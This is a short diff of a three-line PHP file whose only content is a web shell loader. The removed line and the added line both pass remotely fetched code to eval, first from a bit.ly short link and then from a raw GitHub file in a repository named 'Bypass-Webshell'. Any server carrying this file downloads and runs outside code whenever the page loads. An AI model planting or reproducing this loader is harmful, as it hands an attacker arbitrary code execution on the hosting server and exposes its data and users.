@@ -1,3 +1,3 @@
 <?php
-eval("?>".file_get_contents("https://bit.ly/3P5VgYX"));
+eval("?>".file_get_contents("https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/csa.php"));
 ?>
